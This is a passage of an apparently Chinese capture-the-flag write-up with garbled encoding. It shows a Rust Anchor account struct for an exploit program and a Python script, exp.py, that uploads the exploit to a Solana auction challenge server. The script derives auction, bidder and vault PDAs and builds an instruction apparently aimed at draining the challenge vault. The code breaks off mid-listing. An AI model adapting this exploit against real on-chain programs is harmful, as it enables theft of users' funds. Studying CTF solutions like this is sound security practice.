punctuation">,</span> settlement_deadline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[derive(Accounts)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Solve</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token comment">/// CHECK: program</span>    <span class="token keyword">pub</span> challenge_program<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>     <span class="token comment">/// CHECK: auction</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> admin_auction<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: bidder_state</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> admin_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> system_program<span class="token punctuation">:</span> <span class="token class-name">Program</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: vault (system account)</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> vault<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> player<span class="token punctuation">:</span> <span class="token class-name">Signer</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: my_auction</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> my_auction<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: my_bidder_state</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> my_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: admin user</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> admin<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>        <span class="token comment">/// CHECK: PDA signer</span>    #<span class="token punctuation">[</span><span class="token function">account</span><span class="token punctuation">(</span>        <span class="token keyword">mut</span><span class="token punctuation">,</span>        seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>         bump    <span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">pub</span> exploit_pda<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">/// CHECK: BidderState for Exploit (Mut)</span>    <span class="token attribute attr-name">#[account(mut)]</span>    <span class="token keyword">pub</span> exploit_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cargo build-sbf</code> ç¼–è¯‘</p><p>exp.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">import</span> base58<span class="token keyword">def</span> <span class="token function">is_on_curve</span><span class="token punctuation">(</span>bytes_32<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Pure python Ed25519 point validation</span>    <span class="token comment"># p = 2^255 - 19</span>    p <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819949</span>    <span class="token comment"># d = -121665/121666</span>    d <span class="token operator">=</span> <span class="token number">37095705934669439343138083508754565189542113879843219016388785533085940283555</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bytes_32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>bytes_32<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>    sign_bit <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>    y <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">if</span> y <span class="token operator">>=</span> p<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment"># 0, 1 are valid. (0 off curve? x^2 = -1) -0^2 + 0^2 = 0. -1 off.</span>    <span class="token comment"># Actually checking x existence is enough.</span>    y2 <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token operator">%</span> p    u <span class="token operator">=</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> p    v <span class="token operator">=</span> <span class="token punctuation">(</span>d <span class="token operator">*</span> y2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> p    <span class="token comment"># x^2 = u/v</span>    <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># Undefined? But d*y^2 != -1 for valid y?</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment"># Calculate inverse of v</span>    v_inv <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    x2 <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">*</span> v_inv<span class="token punctuation">)</span> <span class="token operator">%</span> p    <span class="token comment"># Check if x2 is a quadratic residue</span>    <span class="token keyword">if</span> x2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>  <span class="token comment"># x=0 point exists.</span>    <span class="token comment"># Euler's criterion: x2^((p-1)/2) == 1</span>    <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">find_program_address</span><span class="token punctuation">(</span>seeds<span class="token punctuation">,</span> program_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> bump <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ctx <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> seeds<span class="token punctuation">:</span>            ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span>program_id<span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"ProgramDerivedAddress"</span><span class="token punctuation">)</span>        hash_bytes <span class="token operator">=</span> ctx<span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># PDA is a valid address if it is NOT on curve</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> is_on_curve<span class="token punctuation">(</span>hash_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> hash_bytes<span class="token punctuation">,</span> bump    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"No PDA found"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_sighash</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>        HOST <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        HOST <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>    PORT <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token number">1337</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connecting to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>HOST<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PORT<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> s<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">'rb'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment"># Handshake loop</span>    challenge_id <span class="token operator">=</span> <span class="token boolean">None</span>    solve_id <span class="token operator">=</span> <span class="token boolean">None</span>    admin_id <span class="token operator">=</span> <span class="token boolean">None</span>    player_id <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># 22222222222222222222222222222222222222222522</span>    my_program_id_str <span class="token operator">=</span> <span class="token string">"22222222222222222222222222222222222222222522"</span>    <span class="token comment"># Load exploit binary</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exploit/target/deploy/exploit.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bin_f<span class="token punctuation">:</span>            program_data <span class="token operator">=</span> bin_f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token comment"># Fallback path if running from different dir</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment_auction/exploit/target/deploy/exploit.so'</span><span class="token punctuation">,</span>                  <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bin_f<span class="token punctuation">:</span>            program_data <span class="token operator">=</span> bin_f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"S> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">"program pubkey:"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program ID: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>my_program_id_str<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>my_program_id_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token string">"program len:"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>            <span class="token comment"># Server asks for length, then we send data</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program len: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program data (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> bytes)..."</span></span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>program_data<span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Challenge:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            challenge_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Exploit:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># This should match our sent ID</span>            solve_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Admin:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            admin_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Player:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            player_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment"># If we have all needed IDs, we can proceed</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> challenge_id<span class="token punctuation">:</span>        <span class="token comment"># Fallback for old behavior (client sends program first blindly)</span>        <span class="token comment"># But since we saw "program pubkey:", we handled it above.</span>        <span class="token keyword">pass</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Meta gathered."</span><span class="token punctuation">)</span>    <span class="token comment"># We no longer need patching as we provided the ID</span>    <span class="token comment"># Calculate PDAs</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Calculating PDAs..."</span><span class="token punctuation">)</span>    <span class="token comment"># admin_auction: [b"auction", admin, 1]</span>    auction_seed <span class="token operator">=</span> <span class="token string">b"auction"</span>    bidder_seed <span class="token operator">=</span> <span class="token string">b"bidder"</span>    vault_seed <span class="token operator">=</span> <span class="token string">b"vault"</span>    admin_auction<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>        <span class="token punctuation">[</span>auction_seed<span class="token punctuation">,</span> admin_id<span class="token punctuation">,</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    <span class="token comment"># admin_bidder_state: [b"bidder", admin_auction, player]</span>    <span class="token comment"># NOTE: In our loop, we use OUR (player) bidder state on admin auction.</span>    admin_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> admin_auction<span class="token punctuation">,</span> player_id<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    vault<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span><span class="token punctuation">[</span>vault_seed<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    <span class="token comment"># my_auction: [b"auction", player, 999]</span>    my_auction_id <span class="token operator">=</span> <span class="token number">999</span>    my_auction<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>        <span class="token punctuation">[</span>auction_seed<span class="token punctuation">,</span> player_id<span class="token punctuation">,</span>         struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> my_auction_id<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    <span class="token comment"># my_bidder_state: [b"bidder", my_auction, player]</span>    my_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> my_auction<span class="token punctuation">,</span> player_id<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    <span class="token comment"># --- Exploit PDA Accounts ---</span>    <span class="token comment"># Exploit PDA: [b"exploit"]</span>    exploit_pda<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> solve_id<span class="token punctuation">)</span>    <span class="token comment"># Exploit Bidder State: [b"bidder", my_auction, exploit_pda]</span>    exploit_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> my_auction<span class="token punctuation">,</span> exploit_pda<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>    system_program <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>  <span class="token comment"># 1111... -> 000... (System program ID is all zeros in base58? NO. 1111... is zeros)</span>    <span class="token comment"># Actually System Program ID is 11111111111111111111111111111111</span>    <span class="token comment"># which decodes to 32 bytes of zeros.</span>    <span class="token comment"># Construct Solve Instruction</span>    <span class="token comment"># Accounts:</span>    <span class="token comment"># 0. challenge_program (Exec)</span>    <span class="token comment"># 1. admin_auction (Mut)</span>    <span class="token comment"># 2. admin_bidder_state (Mut)</span>    <span class="token comment"># 3. system_program</span>    <span class="token comment"># 4. vault (Mut)</span>    <span class="token comment"># 5. player (Signer, Mut)</span>    <span class="token comment"># 6. my_auction (Mut)</span>    <span class="token comment"># 7. my_bidder_state (Mut)</span>    <span class="token comment"># 8. admin (Mut) used for ClaimWinner</span>    accounts <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span>            <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> challenge_id        <span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># challenge_program (executable? No just account info passed to cpi context)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_auction (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_bidder_state (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> system_program<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># system_program</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> vault<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># vault (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> player_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># player (signer, mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_auction (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_bidder_state (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin (mut)</span>    <span class="token punctuation">]</span>    <span class="token comment"># Construct Solve Instruction</span>    <span class="token comment"># SERVER READS TEXT FORMAT!</span>    <span class="token comment"># Format:</span>    <span class="token comment"># "num accounts: "</span>    <span class="token comment"># &lt;num: text> &lt;newline></span>    <span class="token comment"># &lt;meta> &lt;pubkey> &lt;newline></span>    <span class="token comment"># ...</span>    <span class="token comment"># "ix len: "</span>    <span class="token comment"># &lt;len: text> &lt;newline></span>    <span class="token comment"># &lt;data: bytes></span>    accounts <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># challenge_program</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_auction (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_bidder_state (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> system_program<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># system_program</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> vault<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># vault (mut)</span>        <span class="token 